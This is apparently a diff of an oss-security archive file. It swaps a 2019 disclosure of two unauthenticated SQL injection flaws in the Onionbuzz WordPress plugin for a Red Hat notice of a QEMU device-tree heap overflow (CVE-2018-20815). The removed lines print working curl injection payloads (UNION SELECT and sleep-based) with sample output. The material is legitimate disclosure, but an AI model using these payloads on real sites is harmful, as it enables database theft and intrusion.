@@ -1,68 +1,29 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/07/21/1
-Message-ID: <CAN1YN0tHY1PbJ=WeUDs=ToCZ-_JetOhAnJwou3PCdcfsoFy9Cg@mail.gmail.com>
-Date: Sat, 20 Jul 2019 18:35:49 -0400
-From: Eugene Kolo <eugene@...enekolo.com>
-To: oss-security@...ts.openwall.com
-Subject: Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/03/27/1
+Message-ID: <nycvar.YSQ.7.76.1903271534170.27869@xnncv>
+Date: Wed, 27 Mar 2019 15:35:59 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: oss security list <oss-security@...ts.openwall.com>
+Subject: CVE-2018-20815 QEMU: device_tree: heap buffer overflow while loading device tree blob
 Content-Type: text/plain; charset=utf-8
 
-Two unauthenticated/unprivileged SQL injection vulnerabilities in the Viral
-Quiz Maker - Onionbuzz WordPress plugin.
+   Hello,
 
-Information
-===========
-Affected Product: Viral Quiz Maker - OnionBuzz WordPress plugin
-Vendor Homepage: Onionbuzz.com
-Vulnerability Type: SQL Injection
-Discoverer: Eugene Kolodenker
-Date: July-20-2019
+A heap buffer overflow issue was found in the load_device_tree() function of 
+QEMU, which is invoked to load device tree blob at boot time. It occurs due to 
+device tree size manipulation before buffer allocation, which could overflow a 
+signed int type.
 
-1)
+A user/process could use this flaw to potentially execute arbitrary code on a 
+host system with privileges of the QEMU process.
 
-Description
-===========
-Prior to v1.2.2, you could exploit the `points` parameter in the
-`ob_get_results` ajax nopriv handler due to there being no sanitization on
-the points argument. The points parameter is not sanitized prior to be used
-in a SQL query in getResultByPointsTrivia. This allows an
-unauthenticated/unprivileged user to perform a SQL injection attack capable
-of remote code execution and information disclosure.
+Upstream patch:
+---------------
+   -> https://git.qemu.org/?p=qemu.git;a=commitdiff;h=da885fe1ee8b4589047484bd7fa05a4905b52b17
 
-Proof of Concept (POC)
-======================
-```
-curl http://site/wp-admin/admin-ajax.php?action=ob_get_results --data
-"type=get_result&id=1&quiz_type=5&points=1 or 1=0 union all select
-1,1,version(),table_name,1,1,1,1,1 from information_schema.tables;#"
-```
+'CVE-2018-20815' assigned via -> https://cveform.mitre.org/
 
-And get back:
-```
-{"quiz_id":1,"points":"1 or 1=0 union all select
-1,1,version(),table_name,1,1,1,1,1 from
-information_schema.tables;#","title":<DBVERSION>","description":"CHARACTER_SETS","featured_image":"<img
-src=\"1\">","image_caption":"1","is_image":1,"success":1}
-```
-
-
-2)
-
-Description
-===========
-Prior to v1.2.7, you could exploit the `id` parameter in the `set_count`
-ajax nopriv handler due to there being no sanitization on the id argument.
-The id parameter is not sanitized prior to be used in a SQL query in
-saveQuestionVote. This allows an unauthenticated/unprivileged user to
-perform a SQL injection attack capable of remote code execution and
-information disclosure.
-
-
-Proof of Concept (POC)
-======================
-
-```
-curl http://site/wp-admin/admin-ajax.php?type=set_count --data
-"action=ob_question_votes&id=1 or sleep(10);#"
-```
-
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
